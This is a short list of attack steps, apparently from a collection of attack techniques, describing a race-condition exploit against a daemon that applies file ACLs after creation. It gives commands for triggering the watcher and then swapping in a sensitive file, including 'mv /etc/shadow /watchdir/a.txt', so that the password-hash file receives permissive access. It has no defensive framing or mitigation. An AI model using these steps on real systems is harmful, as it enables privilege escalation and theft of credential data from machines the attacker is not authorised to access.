Attack Steps: Step 1: Identify a daemon or tool that automatically applies ACLs or permissions after file creation or modification (e.g., /usr/bin/setfacl -m u:appuser:rw). Step 2: Upload or create a dummy file (e.g., touch /watchdir/a.txt) to trigger the ACL rewrite. Step 3: After the ACL watcher sees the event but before it applies permissions, swap in a sensitive file you want to access (e.g., mv /etc/shadow /watchdir/a.txt).
